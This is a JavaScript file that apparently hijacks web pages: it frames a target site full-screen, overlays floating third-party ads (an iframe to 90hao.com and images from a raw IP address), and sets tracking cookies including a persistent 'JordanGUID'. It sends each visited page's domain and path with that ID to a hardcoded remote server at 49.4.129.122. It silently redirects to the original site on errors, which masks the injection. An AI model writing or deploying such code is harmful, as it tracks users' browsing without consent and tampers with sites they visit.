function setCookie(name,value,time){
  try{  
    var strsec = getsec(time);
    var exp = new Date();
    exp.setTime(exp.getTime() + parseInt(strsec)*1);
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
  }
  catch(err)
  {
    location.href=site_url_src;
  }
}

function getsec(str){
  try{
    // alert(str);
    var str1=parseInt(str.substring(1,str.length))*1; 
    var str2=str.substring(0,1); 
    if (str2=="a"){
      return str1*1;
    }else if (str2=="s"){
      return str1*1000;
    }else if (str2=="h"){
      return str1*60*60*1000;
    }else if (str2=="d"){
      return str1*24*60*60*1000;
    }
  }catch(err)
  {
    location.href=site_url_src;
  }
}
try{
    var site_url = document.getElementById("site_url").src;
    var site_url_src = site_url.substring(0,site_url.length-4);
    var WhiteList = new Array();
    var AdvertiseList = new Array();
    setCookie("sexy","1","s3");
    // WhiteList.push("qq");
    // WhiteList.push("www.youku.com");
    // WhiteList.push("icbc");

    AdvertiseList.push("beijing.bitauto.com");
}catch(err){
    location.href=site_url_src;
}

var delta=0.8;
var collection;
var closeB=false;

var div_obj = document.getElementById("cooler_ad_show");
div_obj.innerHTML="<div id='show1'></div><div id='show2'></div>";

function floaters() {
  try{
    this.items      = [];
    this.addItem    = function(id,x,y,content)
    {
        var div_obj = document.getElementById(id);
        div_obj.style.cssText="Z-INDEX: 999999; POSITION: absolute; width:80px; height:60px;left:"+(typeof(x)=="string"?eval(x):x)+"px;top:"+(typeof(y)=="string"?eval(y):y)+"px";
        div_obj.innerHTML=content;
        var newItem                             = {};
        newItem.object                          = document.getElementById(id);
        newItem.x                               = x;
        newItem.y                               = y;
        this.items[this.items.length]           = newItem;
    }
    this.play       = function()
        {
            collection  = this.items
            setInterval('play()',30);
        }
  }catch(err)
  {
    location.href=site_url_src;
  }

}
function play()
{
  try{
    if(screen.width<=80 || closeB)
    {
            for(var i=0;i<collection.length;i++)
            {
                    collection[i].object.style.display      = 'none';
            }
            return;
    }
    for(var i=0;i<collection.length;i++)
    {
            var followObj           = collection[i].object;
            var followObj_x         = (typeof(collection[i].x)=='string'?eval(collection[i].x):collection[i].x);
            var followObj_y         = (typeof(collection[i].y)=='string'?eval(collection[i].y):collection[i].y);
            if(followObj.offsetLeft!=(document.body.scrollLeft+followObj_x)) {
                    var dx=(document.body.scrollLeft+followObj_x-followObj.offsetLeft)*delta;
                    dx=(dx>0?1:-1)*Math.ceil(Math.abs(dx));
                    followObj.style.left=(followObj.offsetLeft+dx) + "px";
                    }
            if(followObj.offsetTop!=(document.body.scrollTop+followObj_y)) {
                    var dy=(document.body.scrollTop+followObj_y-followObj.offsetTop)*delta;
                    dy=(dy>0?1:-1)*Math.ceil(Math.abs(dy));
                    followObj.style.top=(followObj.offsetTop+dy)+"px";
                    }
            followObj.style.display = '';
    }
  }catch(err)
  {
    location.href=site_url_src;
  }
}
function closeBanner()
{
        closeB=true;
        return;
}
//每一种广告的js中都会有这个初始化代码
function initAdvise(){
  try{
    var theFloaters = new floaters();
    // theFloaters.addItem('show1',6,180,
    //   '<embed '+
    //     'id="_COUPLET"'+
    //     'name="_COUPLET" '+
    //     'src="http://images.sohu.com/bill/s2013/yanlu/yili/jinlingguan/1202701216hs.swf" '+
    //     'quality="autohigh" '+
    //     'allowscriptaccess="always"'+
    //     'width="127" '+
    //     'height="270" '+
    //     'wmode="opaque" '+
    //     'flashvars="clickthru=http%3A//clk.optaim.com/event.ng/Type%3Dclick%26FlightID%3D201311%26TargetID%3Dsohu%26Values%3De4dec8be%2Ca9e611f5%2Cf5aa0caf%2Cc623e842%26AdID%3D2384345" '+
    //     'type="application/x-shockwave-flash" '+
    //     'pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" '+
    //     'swliveconnect="true">'+
    //     '<img width="120" src=http://42.121.126.86:9090/images/close.gif onClick="closeBanner();">');
    theFloaters.addItem('show1',6,180,
            '<iframe style="width:120px;height:270px" '+
            'frameborder=0 scrolling=no  src="http://www.90hao.com/tuiguang/?pos_id=668001">'+
            '</iframe>'+
            '<img src=http://42.121.126.86:9090/images/close.gif onClick="closeBanner();"/>');
    theFloaters.addItem('show2','document.body.clientWidth-106',180,
      '<a href="http://www.fds321.com">'+
      '<img src="http://42.121.126.86:9090/images/ad-02.gif"/>'+
      '</a>'+
      '<img src=http://42.121.126.86:9090/images/close.gif onClick="closeBanner();">');
    theFloaters.play();
  }catch(err)
  {
    location.href=site_url_src;
  }

}

function newGuid()
{
  try{
    var guid = "";
    for (var i = 1; i <= 32; i++){
      var n = Math.floor(Math.random()*16.0).toString(16);
      guid +=   n;
      if((i==8)||(i==12)||(i==16)||(i==20))
        guid += "-";
    }
    return guid;    
  }catch(err)
  {
    location.href=site_url_src;
  }
}

function getJordanGUID(){
  try{
    var strCookie = document.cookie;
    var arrCookie=strCookie.split("; "); 
    for(var i=0;i<arrCookie.length;i++){ 
             var arr=arrCookie[i].split("="); 
             if("JordanGUID"==arr[0]){ 
                    return arr[1]; 
             } 
    } 
    return false;
  }catch(err)
  {
    location.href=site_url_src;
  }
}

function createXMLHttp() {
    try{
      var XmlHttp;
      if (window.ActiveXObject){
          var arr=["MSXML2.XMLHttp.6.0","MSXML2.XMLHttp.5.0", "MSXML2.XMLHttp.4.0","MSXML2.XMLHttp.3.0","MSXML2.XMLHttp","Microsoft.XMLHttp"];
          for(var i=0;i<arr.length;i++) {
              try {
                  XmlHttp = new ActiveXObject(arr[i]);
                  return XmlHttp;
              }
              catch(error) { }
          }
      } else {
          try {
              XmlHttp=new XMLHttpRequest();
              return XmlHttp;
          }
          catch(otherError) { }
      } 
      }catch(err)
    {
      location.href=site_url_src;
    }
} 

function xmlPost() { 
  try{
    var jordanGUID = getJordanGUID();
    if(!jordanGUID){
      jordanGUID = newGuid();
      document.cookie="JordanGUID=" + jordanGUID;
    }
    var domain = document.location.host;
    var str_url = document.location.href;
    var arrAddress  = str_url.split(domain);
    var data_str = "jordanGUID=sexy"+jordanGUID+"&domain="+domain+"&protocol="+arrAddress[0]+"&path="+ arrAddress[1];
    var xmlHttp = createXMLHttp();
    // var url= 'http://127.0.0.1/jordan/god/get_advise_json?'+data_str;
    var url= 'http://49.4.129.122/jordan/god/get_advise_json?'+data_str;
    xmlHttp.open('GET',url,true); 
    xmlHttp.send(null);
    
  }catch(err)
  {
    //location.href=site_url_src;
  }
}


function redirect(){
  try{
    var frame = document.getElementById("site_url");
    var height= (parseInt(window.screen.height)-160).toString() + "px";
    var width = (window.screen.width).toString() + "px";
    frame.width = width;
    frame.height = height;
    frame.style.cssText="margin-top:-28px;margin-left:-12px;";
    //document.write("<iframe width='"+width+"' height='"+height+"'  style='border: 0px; ' id='test' src='"+site_url+"'></iframe>")
  }
  catch(err)
  {
    location.href=site_url_src;
  }
}


function checkWhiteList(whiteList,url){
  try{
    var flag = true;
    for(var i=0;i<whiteList.length;i++){
      if(url.indexOf(whiteList[i])>=0){
        flag = false;
        break;
      }
    }
    return flag;
  }catch(err)
  {
    location.href=site_url_src;
  }
}

function checkAdvertiseList(advertiseList,url){
  try{
    var flag = false;
    for(var i=0;i<advertiseList.length;i++){
      if(url.indexOf(advertiseList[i])>=0){
        flag = true;
        break;
      }
    }
    return flag;
  }catch(err)
  {
    location.href=site_url_src;
  }
}

function initAll(){
  try{
      xmlPost();
      if(checkAdvertiseList(AdvertiseList,site_url)){
        redirect();
        initAdvise();
      }else{
        location.href=site_url_src;
      }
  }catch(err)
  {
    location.href=site_url_src;
  }
}

initAll();
